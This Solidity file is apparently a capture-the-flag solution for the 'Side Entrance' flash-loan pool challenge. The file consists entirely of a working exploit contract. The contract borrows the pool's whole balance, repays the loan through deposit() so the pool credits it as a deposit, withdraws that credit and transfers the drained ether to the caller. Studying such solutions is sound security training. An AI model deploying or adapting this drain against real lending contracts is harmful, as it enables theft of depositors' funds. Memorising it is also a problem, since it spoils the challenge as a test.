// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface SideEntrance {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract SideEntranceExploit {
    SideEntrance S;

    constructor(address _target){
        S = SideEntrance(_target);
    }

    function _balanceOf() public view returns(uint256, uint256, uint256){
        return (address(this).balance, address(S).balance, address(tx.origin).balance);
    }

    function exploit() public {
        S.flashLoan(address(S).balance);
        S.withdraw();
        payable(tx.origin).transfer(address(this).balance);
    }

    function execute() external payable {
        S.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}